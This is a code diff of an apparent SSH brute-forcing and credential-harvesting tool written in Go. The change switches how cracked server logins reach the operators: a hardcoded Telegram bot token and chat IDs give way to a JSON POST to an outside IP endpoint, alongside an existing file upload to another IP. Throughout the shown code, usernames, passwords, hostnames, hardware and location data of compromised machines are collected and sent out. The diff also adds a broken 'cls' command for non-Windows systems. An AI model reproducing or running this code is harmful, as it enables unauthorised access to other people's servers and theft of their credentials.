@@ -36,7 +36,7 @@ var (
 	successfulIPs       = make(map[string]struct{})
 	mapMutex            sync.Mutex
 	botToken            = "8263323532:AAFxOOKjtvBLcKXsmvcWHwA_Z78ahZEVcTA"
-	chatIDs             = []int64{-5114002631}
+	chatIDs             = []int64{-1003855098721}
 	concurrentPerWorker int
 	apiConfig           = Config{
 		APIEndpoint: "http://38.242.224.156:5190/upload",
@@ -150,7 +150,7 @@ func clear() {
 	if runtime.GOOS == "windows" {
 		cmd = exec.Command("cmd", "/c", "cls")
 	} else {
-		cmd = exec.Command("clear")
+		cmd = exec.Command("cls")
 	}
 	cmd.Stdout = os.Stdout
 	cmd.Run()
@@ -446,63 +446,65 @@ func createTelegramBot() *tgbotapi.BotAPI {
 	}
 }
 
-// === SEND SUCCESS BATCH ===
 func sendSuccessBatch(batch []Success) {
-	bot := createTelegramBot()
 	for _, s := range batch {
-		// Escape all dynamic data
-		ip := html.EscapeString(s.Info.IP)
-		port := html.EscapeString(s.Info.Port)
-		user := html.EscapeString(s.Info.Username)
-		pass := html.EscapeString(s.Info.Password)
-		host := html.EscapeString(s.Info.Hostname)
-		osInfo := html.EscapeString(s.Info.OSInfo)
-		sshVer := html.EscapeString(s.Info.SSHVersion)
-		ports := html.EscapeString(strings.Join(s.Info.OpenPorts, ", "))
-		country := html.EscapeString(s.IPInfo.Country)
-		region := html.EscapeString(s.IPInfo.Region)
-		city := html.EscapeString(s.IPInfo.City)
-		org := html.EscapeString(s.IPInfo.Org)
-		cpuCores := strconv.Itoa(s.Info.CPUCores)
-		arch := html.EscapeString(s.Info.Architecture)
-		cpuModel := html.EscapeString(s.Info.CPUModel)
+		// Prepare data for web - MATCHING FLASK EXPECTATIONS
+		data := map[string]interface{}{
+			"target":         fmt.Sprintf("%s:%s", s.Info.IP, s.Info.Port), // Combine IP and port
+			"port":           s.Info.Port,
+			"username":       s.Info.Username,
+			"password":       s.Info.Password,
+			"hostname":       s.Info.Hostname,
+			"os_info":        s.Info.OSInfo,
+			"ssh_version":    s.Info.SSHVersion,
+			"response_time":  s.Info.ResponseTime.String(),
+			"open_ports":     s.Info.OpenPorts,
+			"cpu_cores":      s.Info.CPUCores,
+			"architecture":   s.Info.Architecture,
+			"cpu_model":      s.Info.CPUModel,
+			"country":        s.IPInfo.Country,
+			"region":         s.IPInfo.Region,
+			"city":           s.IPInfo.City,
+			"org":            s.IPInfo.Org,
+			"honeypot_score": s.Info.HoneypotScore,
+		}
 
-		msg := fmt.Sprintf(`<b>Made By TreTrauNetwork</b>
+		// Convert to JSON
+		jsonData, err := json.Marshal(data)
+		if err != nil {
+			fmt.Printf("Error marshaling data: %v\n", err)
+			continue
+		}
 
-🎯 <b>Target:</b> <span class="tg-spoiler">%s</span>
-👤 <b>User:</b>   <span class="tg-spoiler"><code>%s</code></span>
-🔑 <b>Pass:</b>   <span class="tg-spoiler">%s</span>
+		// Send to Flask web app
+		url := "http://95.111.236.210:5000/vpsadd"
 
-🖥️ <b>Host:</b> %s
-🧩 <b>OS:</b> %s
-🔌 <b>SSH:</b> %s
-⚡ <b>Time:</b> %v
-🚪 <b>Ports:</b> %s
-🧠 <b>CPU:</b> %s
-🏗️ <b>Arch:</b> %s
-💾 <b>Chip:</b> %s
+		// Create HTTP client with timeout
+		client := &http.Client{
+			Timeout: 10 * time.Second,
+		}
 
-🌍 <b>Country:</b> <span class="tg-spoiler">%s</span>
-📍 <b>Region:</b> <span class="tg-spoiler">%s</span>
-🏙️ <b>City:</b> <span class="tg-spoiler">%s</span>
-🏢 <b>Org:</b> <span class="tg-spoiler">%s</span>
-🪤 <b>Honeypot:</b> %d
-⏰ <b>Timestamp:</b> %s`,
-		ip, port, user, pass,
-		host, osInfo, sshVer, s.Info.ResponseTime, ports, cpuCores, arch, cpuModel,
-		country, region, city, org, s.Info.HoneypotScore,
-		time.Now().Format("2006-01-02 15:04:05"))
+		for {
+			fmt.Printf("Sending data to %s...\n", url)
+			resp, err := client.Post(url, "application/json", bytes.NewBuffer(jsonData))
+			if err != nil {
+				fmt.Printf("Failed to send to web: %v. Retrying in 3s...\n", err)
+				time.Sleep(3 * time.Second)
+				continue
+			}
 
-		for _, id := range chatIDs {
-			for {
-				m := tgbotapi.NewMessage(id, msg)
-				m.ParseMode = "HTML"
-				if _, err := bot.Send(m); err == nil {
-					break
-				} else {
-					log.Printf("Send failed: %v. Retrying in 3s...", err)
-					time.Sleep(3 * time.Second)
-				}
+			body, _ := io.ReadAll(resp.Body)
+
+			if resp.StatusCode == http.StatusCreated {
+				fmt.Printf("✅ Successfully logged VPS: %s:%s - Response: %s\n",
+					s.Info.IP, s.Info.Port, string(body))
+				resp.Body.Close()
+				break
+			} else {
+				fmt.Printf("❌ Server returned %s: %s. Retrying in 3s...\n",
+					resp.Status, string(body))
+				resp.Body.Close()
+				time.Sleep(3 * time.Second)
 			}
 		}
 	}
@@ -511,7 +513,7 @@ func sendSuccessBatch(batch []Success) {
 // === SEND HIGH-SCORE HONEYPOT TO TELEGRAM + API ===
 func sendHighScoreHoneypot(s Success) {
 	bot := createTelegramBot()
-	
+
 	// Escape all dynamic data
 	ip := html.EscapeString(s.Info.IP)
 	port := html.EscapeString(s.Info.Port)
@@ -573,10 +575,10 @@ func sendHighScoreHoneypot(s Success) {
 	}
 
 	// Create honeypot file and upload to API
-	honeypotLine := fmt.Sprintf("HONEYPOT_HIGHSCORE: %s:%s@%s:%s (Score: %d) CPU: %d\n", 
+	honeypotLine := fmt.Sprintf("HONEYPOT_HIGHSCORE: %s:%s@%s:%s (Score: %d) CPU: %d\n",
 		s.Info.IP, s.Info.Port, s.Info.Username, s.Info.Password, score, s.Info.CPUCores)
 	appendToFile(honeypotLine, "honeypots.txt")
-	
+
 	// Upload to API immediately
 	if err := UploadFile(apiConfig, "honeypots.txt"); err != nil {
 		log.Printf("High-score honeypot API upload failed: %v", err)
@@ -791,12 +793,12 @@ func isValidShellResponse(info *ServerInfo) bool {
 	}
 
 	// 2. Length check: Hostnames shouldn't be paragraphs
-	// Real hostnames are usually short (e.g., "server1" or "ubuntu"). 
+	// Real hostnames are usually short (e.g., "server1" or "ubuntu").
 	// Garbage output like your example is very long.
 	if len(info.Hostname) > 100 {
 		return false
 	}
-	
+
 	// 3. Newline check: A hostname command should return a single line.
 	// If it returns multiple lines (after trimming), it's likely a banner.
 	if strings.Count(strings.TrimSpace(info.Hostname), "\n") > 0 {
@@ -892,16 +894,16 @@ Timestamp: %s
 	} else {
 		atomic.AddInt64(&stats.honeypots, 1)
 		log.Printf("Honeypot: %s:%s (Score: %d)", info.IP, info.Port, info.HoneypotScore)
-		
+
 		// NEW: Check for high-score honeypots (10 or 12, since 11 is now treated as Good)
 		// and send to Telegram + API
 		if info.HoneypotScore >= 10 {
-			appendToFile(fmt.Sprintf("HONEYPOT_HIGHSCORE: %s:%s@%s:%s (Score: %d) CPU: %d\n", 
+			appendToFile(fmt.Sprintf("HONEYPOT_HIGHSCORE: %s:%s@%s:%s (Score: %d) CPU: %d\n",
 				info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores), "honeypots.txt")
 			honeypotChan <- Success{Info: info, IPInfo: ipinfo}
 			return
 		}
-		
+
 		// Regular honeypots (score < 10)
 		appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d) CPU: %d\n", info.IP, info.Port, info.Username, info.Password, info.HoneypotScore, info.CPUCores), "honeypots.txt")
 	}
